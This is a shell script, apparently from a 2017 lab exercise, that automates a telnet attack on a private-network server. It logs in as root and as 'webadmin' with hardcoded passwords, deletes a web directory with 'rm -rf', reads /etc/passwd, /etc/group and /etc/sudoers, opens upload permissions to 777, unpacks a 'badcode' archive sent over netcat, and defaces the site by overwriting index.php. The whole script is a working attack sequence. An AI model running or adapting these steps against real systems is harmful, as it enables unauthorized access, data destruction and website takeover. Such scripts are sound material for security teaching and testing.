#!/bin/sh

##############################################################
# Login via telnet with previously found webadmin login data;
# Unpack uploaded files from netcat; have a look at permissions aso.
# Leave a message for all website visitors :)
# => original index.php will be backed up to index.php.bak for later reuse
# Ing. Alexander Poschenreithner, 2017
##############################################################


# Telnet

echo "     => Telnet root access"
(
echo open 10.11.12.10
sleep 2
echo "root"
sleep 2
echo "tryme"
sleep 2
echo "exit"
) | telnet >> /tmp/attack.log


echo "     => Telnet webadmin access, trying to delete a dir"
(
echo open 10.11.12.10
sleep 1
echo "webadmin"
sleep 1
echo "lucky75"
sleep 1
echo "rm -rf web"
sleep 2
) | telnet >> /tmp/attack.log


echo "     => Telnet webadmin access, unpacking badcode (transfered by netcat), taking over Website"
(
echo open 10.11.12.10
sleep 1
echo "webadmin"
sleep 1
echo "lucky75"
sleep 1
echo "ls -lisah"
sleep 1
echo "grep 'x:0:' /etc/passwd"
sleep 1
echo "grep root /etc/group"
sleep 1
echo "sudo cat /etc/sudoers"
sleep 1
echo "sudo chmod -R 777 upload"
sleep 2
echo "cd upload"
sleep 1
echo "sudo tar zxvf badcode.tgz ."
sleep 4
echo "ls"
sleep 1
echo "cd .."
sleep 1
echo "cp index.php index.php.bak"
sleep 1
echo "echo '\n(_)\n _  ___  _   _\n| |/ _ \| | | |\n| | (_) | |_| |\n|_|\___/ \__,_|\n\n ;-)' > index.php"
sleep 1
echo "cat index.php"
sleep 4
) | telnet >> /tmp/attack.log
